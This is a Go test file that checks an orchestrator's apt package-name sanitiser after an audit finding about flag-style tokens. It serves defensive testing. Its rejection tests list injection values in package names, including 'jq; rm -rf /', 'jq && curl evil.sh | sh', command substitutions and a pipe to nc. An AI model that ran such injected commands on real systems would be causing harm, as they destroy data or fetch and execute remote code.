package orchestrator

import (
	"context"
	"strings"
	"testing"
)

// These tests lock finding F9 (LOW) from the 2026-06 security audit
// (.claude/context/SECURITY-AUDIT-2026-06.md): the PreRunInstallPackages
// sanitiser (internal/orchestrator/exec_sidecar.go) must reject any package
// token that begins with '-' (and empty tokens). Before the fix '-' was
// allowed anywhere in a name, so a "package" like "--reinstall" or "-V" passed
// validation and was concatenated straight into the `apt-get install -y -qq
// <pkg>` command line, where apt treats it as a flag, not a package. Internal
// dashes (e.g. "ca-certificates") remain valid; only a leading dash is a flag.
//
// The mock ContainerProvider (credExecFake) and quietCredLogger helper are
// reused from exec_sidecar_writecreds_test.go in this same package: credExecFake
// records the exact `sh -c` script body in scriptSeen, which is exactly the apt
// command line we want to inspect.

// flagStylePackages enumerates the apt flag-style tokens the sanitiser must
// reject — each begins with '-', so apt would interpret it as a flag.
var flagStylePackages = []string{
	"--reinstall",
	"-V",
	"--allow-downgrades",
	"-y", // already implied, but proves a bare short flag is rejected too
}

// TestPreRunInstall_LeadingDashFlag_Rejected is the flipped F9 tripwire: a
// leading-dash "package" must be rejected with an "invalid package name" error
// and must NEVER reach the exec'd apt command line. If the sanitiser regresses
// and admits the flag, the apt-install line would contain it and this fails.
func TestPreRunInstall_LeadingDashFlag_Rejected(t *testing.T) {
	t.Parallel()
	for _, pkg := range flagStylePackages {
		pkg := pkg
		t.Run(pkg, func(t *testing.T) {
			fake := &credExecFake{}
			err := PreRunInstallPackages(context.Background(), fake, "ctr-x",
				[]string{pkg}, quietCredLogger())
			if err == nil {
				t.Fatalf("F9 regression: flag-style %q must be rejected, but validation passed (script: %q)", pkg, fake.scriptSeen)
			}
			if !strings.Contains(err.Error(), "invalid package name") {
				t.Fatalf("expected 'invalid package name' error for %q, got %v", pkg, err)
			}
			if fake.execCalls != 0 {
				t.Fatalf("rejected %q must not reach Exec, but execCalls=%d (script: %q)", pkg, fake.execCalls, fake.scriptSeen)
			}
		})
	}
}

// TestPreRunInstall_LegitPackage is a plain regression guard: a normal package
// name must validate and flow into the install command unchanged. This must keep
// passing after the F9 fix — the fix should only reject leading-dash names, not
// ordinary ones (which legitimately contain internal dashes, e.g. "g++-12",
// "lib-foo").
func TestPreRunInstall_LegitPackage(t *testing.T) {
	t.Parallel()
	cases := []string{"jq", "ca-certificates", "g++", "python3.11", "libssl-dev"}
	for _, pkg := range cases {
		pkg := pkg
		t.Run(pkg, func(t *testing.T) {
			fake := &credExecFake{}
			if err := PreRunInstallPackages(context.Background(), fake, "ctr-x",
				[]string{pkg}, quietCredLogger()); err != nil {
				t.Fatalf("legit package %q must validate, got %v", pkg, err)
			}
			if fake.execCalls != 1 {
				t.Fatalf("expected exactly one exec for %q, got %d", pkg, fake.execCalls)
			}
			if !strings.Contains(fake.scriptSeen, "apt-get install -y -qq "+pkg) {
				t.Fatalf("package %q missing from install line; script:\n%s", pkg, fake.scriptSeen)
			}
		})
	}
}

// TestPreRunInstall_ShellMetacharsRejected is a regression guard for behaviour
// that is ALREADY secure: the sanitiser rejects shell metacharacters and other
// non-[a-zA-Z0-9.+-] bytes, so command-injection via the package list is not
// possible. Only the leading-dash flag case (F9) slips through; everything here
// must error and never reach Exec.
func TestPreRunInstall_ShellMetacharsRejected(t *testing.T) {
	t.Parallel()
	bad := []string{
		"jq; rm -rf /",
		"jq && curl evil.sh | sh",
		"jq`id`",
		"jq$(whoami)",
		"jq|nc",
		"jq with space",
		"jq\nrm",
	}
	for _, pkg := range bad {
		pkg := pkg
		t.Run(pkg, func(t *testing.T) {
			fake := &credExecFake{}
			err := PreRunInstallPackages(context.Background(), fake, "ctr-x",
				[]string{pkg}, quietCredLogger())
			if err == nil {
				t.Fatalf("metachar-laden package %q must be rejected, but validation passed (script: %q)", pkg, fake.scriptSeen)
			}
			if !strings.Contains(err.Error(), "invalid package name") {
				t.Fatalf("expected 'invalid package name' error for %q, got %v", pkg, err)
			}
			if fake.execCalls != 0 {
				t.Fatalf("rejected package %q must not reach Exec, but execCalls=%d", pkg, fake.execCalls)
			}
		})
	}
}

// TestPreRunInstall_EmptyNoop guards the early-return: no packages means no exec.
func TestPreRunInstall_EmptyNoop(t *testing.T) {
	t.Parallel()
	fake := &credExecFake{}
	if err := PreRunInstallPackages(context.Background(), fake, "ctr-x", nil, quietCredLogger()); err != nil {
		t.Fatalf("empty package list must be a noop, got %v", err)
	}
	if fake.execCalls != 0 {
		t.Fatalf("empty package list must not exec, got execCalls=%d", fake.execCalls)
	}
}

// --- Secure target (F9 fixed) -----------------------------------------------
//
// A package name that begins with '-' must be rejected with an "invalid
// package name" error before any Exec runs — apt must never receive a
// flag-style argument sourced from the package list.
func TestPreRunInstall_LeadingDash_SecureTarget(t *testing.T) {
	t.Parallel()
	for _, pkg := range flagStylePackages {
		fake := &credExecFake{}
		err := PreRunInstallPackages(context.Background(), fake, "ctr-x",
			[]string{pkg}, quietCredLogger())
		if err == nil || !strings.Contains(err.Error(), "invalid package name") {
			t.Fatalf("leading-dash %q must be rejected with 'invalid package name', got %v", pkg, err)
		}
		if fake.execCalls != 0 {
			t.Fatalf("rejected %q must not reach Exec, got execCalls=%d", pkg, fake.execCalls)
		}
	}
}
